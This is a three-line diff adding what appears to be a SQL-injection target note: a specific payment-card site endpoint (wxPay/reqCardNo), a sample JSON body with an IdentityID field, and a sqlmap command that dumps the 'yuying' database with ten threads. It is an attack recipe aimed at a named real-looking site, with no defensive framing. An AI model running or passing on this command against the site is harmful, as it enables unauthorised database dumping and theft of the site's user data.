@@ -1,0 +1,3 @@
+http://www.baihecard.com:8870/wxPay/reqCardNo (POST)  # sqlmap.py -r 132 -D yuying --dump --thread 10
+
+{"IdentityID":"2016081850"}
